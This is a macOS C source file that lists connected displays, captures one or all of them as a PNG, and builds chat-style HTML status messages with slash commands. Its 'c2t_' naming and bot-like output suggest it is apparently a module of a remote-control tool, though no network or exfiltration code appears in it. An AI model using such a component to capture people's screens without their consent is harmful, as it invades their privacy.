/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#ifdef __APPLE__

#import <ApplicationServices/ApplicationServices.h>
#import <CoreFoundation/CoreFoundation.h>
#import <CoreGraphics/CoreGraphics.h>
#import <ImageIO/ImageIO.h>
#import <dlfcn.h>
#include "screenshot.h"
#include "../logging/logging.h"

#include <ctype.h>
#include <stdlib.h>
#include <string.h>

#define MAX_MAC_DISPLAYS 16
static CGDirectDisplayID mac_displays[MAX_MAC_DISPLAYS];
static uint32_t mac_display_count = 0;
static char selected_display_target[64] = "all";
static int selected_display_index = -1;

typedef CGImageRef (*c2t_CGWindowListCreateImage_t)(CGRect, CGWindowListOption, CGWindowID, CGWindowImageOption);

static void refresh_macos_displays(void) {
  mac_display_count = 0;
  CGGetActiveDisplayList(MAX_MAC_DISPLAYS, mac_displays, &mac_display_count);
}

int screenshot_capture_macos_display(const char *target,
                                    void **out_data, size_t *out_size,
                                    const char **out_mime_type,
                                    const char **out_filename) {
  if (!out_data || !out_size || !out_mime_type || !out_filename) {
    return 0;
  }
  *out_data = NULL;
  *out_size = 0;

  refresh_macos_displays();

  int target_idx = -1;
  if (target && *target && strcmp(target, "all") != 0 && strcmp(target, "*") != 0) {
    target_idx = atoi(target);
  }

  CGRect capture_rect;
  if (target_idx >= 0 && (uint32_t)target_idx < mac_display_count) {
    capture_rect = CGDisplayBounds(mac_displays[target_idx]);
  } else {
    capture_rect = CGRectInfinite;
  }

  CGImageRef image = NULL;

  /* 1. Dynamic fallback to CGWindowListCreateImage via dlsym to prevent compile-time SDK deprecation/obsoletion errors on Xcode 16/26 / macOS 15+ */
  c2t_CGWindowListCreateImage_t pCGWindowListCreateImage =
      (c2t_CGWindowListCreateImage_t)dlsym(RTLD_DEFAULT, "CGWindowListCreateImage");
  if (pCGWindowListCreateImage) {
    image = pCGWindowListCreateImage(
        capture_rect,
        kCGWindowListOptionOnScreenOnly,
        kCGNullWindowID,
        kCGWindowImageDefault);
  }

  if (!image) {
    c2t_log_warning("screenshot", "Screen capture failed on macOS; verify Screen Recording permissions in System Settings");
    return 0;
  }

  CFMutableDataRef mutable_data = CFDataCreateMutable(kCFAllocatorDefault, 0);
  if (!mutable_data) {
    CGImageRelease(image);
    return 0;
  }

  CGImageDestinationRef destination = CGImageDestinationCreateWithData(
      mutable_data, CFSTR("public.png"), 1, NULL);
  if (!destination) {
    CFRelease(mutable_data);
    CGImageRelease(image);
    return 0;
  }

  CGImageDestinationAddImage(destination, image, NULL);
  if (!CGImageDestinationFinalize(destination)) {
    c2t_log_warning("screenshot", "CGImageDestinationFinalize failed to encode PNG");
    CFRelease(destination);
    CFRelease(mutable_data);
    CGImageRelease(image);
    return 0;
  }

  CFIndex length = CFDataGetLength(mutable_data);
  const UInt8 *bytes = CFDataGetBytePtr(mutable_data);
  if (length <= 0 || !bytes) {
    CFRelease(destination);
    CFRelease(mutable_data);
    CGImageRelease(image);
    return 0;
  }

  void *png_buf = malloc((size_t)length);
  if (!png_buf) {
    c2t_log_error("screenshot", "Out of memory allocating PNG buffer (%ld bytes)", (long)length);
    CFRelease(destination);
    CFRelease(mutable_data);
    CGImageRelease(image);
    return 0;
  }

  memcpy(png_buf, bytes, (size_t)length);
  size_t width = CGImageGetWidth(image);
  size_t height = CGImageGetHeight(image);

  CFRelease(destination);
  CFRelease(mutable_data);
  CGImageRelease(image);

  *out_data = png_buf;
  *out_size = (size_t)length;
  *out_mime_type = "image/png";
  *out_filename = "screenshot.png";
  c2t_log_info("screenshot", "Captured %zux%zu macOS display screenshot (%ld bytes PNG)", width, height, (long)length);
  return 1;
}

int screenshot_capture_macos(void **out_data, size_t *out_size,
                             const char **out_mime_type,
                             const char **out_filename) {
  return screenshot_capture_display("all", out_data, out_size, out_mime_type, out_filename);
}

int screenshot_get_display_list(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0) return 0;
  refresh_macos_displays();

  if (mac_display_count == 0) {
    snprintf(buffer, max_len,
             "🖥️ <b>Connected Displays (macOS):</b>\n\n"
             "• <b>[all]</b> <i>Virtual Desktop / Main Display</i> — 🟢 <b>ACTIVE</b>\n\n"
             "🎯 <b>Current Target:</b> <code>%s</code>\n"
             "💡 <i>Select display with <code>/screenshot_select &lt;id|all&gt;</code></i>",
             selected_display_target);
    return 1;
  }

  size_t offset = (size_t)snprintf(
      buffer, max_len, "🖥️ <b>Detected Displays (%u):</b>\n\n", mac_display_count);

  for (uint32_t i = 0; i < mac_display_count && offset + 128 < max_len; ++i) {
    CGRect b = CGDisplayBounds(mac_displays[i]);
    int is_main = CGDisplayIsMain(mac_displays[i]);
    int active = (selected_display_index == (int)i) || (selected_display_index == -1);

    offset += (size_t)snprintf(
        buffer + offset, max_len - offset,
        "• <b>[%u]</b> <code>Display %u</code> (%.0fx%.0f)%s\n"
        "  Status: %s\n",
        i, (unsigned int)mac_displays[i], b.size.width, b.size.height,
        is_main ? " 🌟 <i>Main</i>" : "",
        active ? "🟢 <b>ACTIVE</b>" : "⚪ <i>IDLE</i>");
  }

  if (offset + 128 < max_len) {
    snprintf(buffer + offset, max_len - offset,
             "\n🎯 <b>Current Target:</b> <code>%s</code>\n"
             "💡 <i>Select display with <code>/screenshot_select &lt;id|all&gt;</code></i>",
             selected_display_target);
  }
  return 1;
}

int screenshot_select_display(const char *target) {
  if (!target || !*target || strcmp(target, "all") == 0 || strcmp(target, "*") == 0) {
    selected_display_index = -1;
    snprintf(selected_display_target, sizeof(selected_display_target), "all");
  } else {
    int is_num = 1;
    for (const char *p = target; *p; ++p) {
      if (!isdigit((unsigned char)*p)) {
        is_num = 0;
        break;
      }
    }
    if (is_num) {
      selected_display_index = atoi(target);
      snprintf(selected_display_target, sizeof(selected_display_target), "%d", selected_display_index);
    } else {
      selected_display_index = -1;
      snprintf(selected_display_target, sizeof(selected_display_target), "%s", target);
    }
  }
  c2t_log_info("screenshot", "Selected macOS display target '%s'", selected_display_target);
  return 1;
}

void screenshot_get_selected_display(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0) return;
  snprintf(buffer, max_len, "%s", selected_display_target);
}

int screenshot_get_display_count(void) {
  refresh_macos_displays();
  return mac_display_count > 0 ? (int)mac_display_count : 1;
}

#endif
